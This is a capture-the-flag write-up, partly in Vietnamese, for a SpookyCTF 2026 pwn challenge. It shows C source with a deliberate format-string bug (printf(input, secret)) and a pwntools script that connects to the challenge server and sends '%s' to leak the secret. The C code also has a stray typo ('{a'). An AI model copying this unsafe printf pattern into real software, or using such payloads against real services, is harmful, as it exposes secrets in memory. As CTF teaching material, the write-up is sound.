---
title: 'Cyberphobia: Formatting Nightmare'
description: ''
date: '2026-11-08T04:46:02.533Z'
categories:
  - Writeup
tags:
  - Pwn
  - Easy
cover: ''
math: false
draft: false
author: Hân
writeup_group: CTF
writeup_subgroup: SpookyCTF 2026
---
# Cyberphobia: Formatting Nightmare
## Challenge description
> I trusted the string, it revealed my secrets. flag can only be fetched from the remote server, wrap answer in `spooky{}`
## Solution
```C++
#include <stdio.h>
#include <stdlib.h>

void vuln(const char *secret) {
    char input[256];
    printf("Input: ");

    if (fgets(input, sizeof(input), stdin) == NULL)
        return;

    printf(input, secret);
    printf("\n");
}

int main(void) {
    char secret[256];

    FILE *fp = fopen("/opt/ctf/chall2/secret.txt", "r");
    if (fp == NULL) {
        perror("/opt/ctf/chall2/secret.txt");
        return 1;
    }

    if (fgets(secret, sizeof(secret), fp) == NULL) {a
        fclose(fp);
        return 1;
    }
    fclose(fp);

    vuln(secret);
    return 0;
}
```
Nhìn vào `printf(input, secret);` ta thấy có lỗi `format string` ở đây. 

`printf` nhận `input` làm định dạng để in `secret (ở đây là flag)` ra.
Vậy ta chỉ cần nhập vào `%s` là được.
```Python
from pwn import *
p = remote("18.226.103.146", 9002)
context.log_level = "debug"
p.sendline(b"%s")
p.recvall()
p.interactive()
```
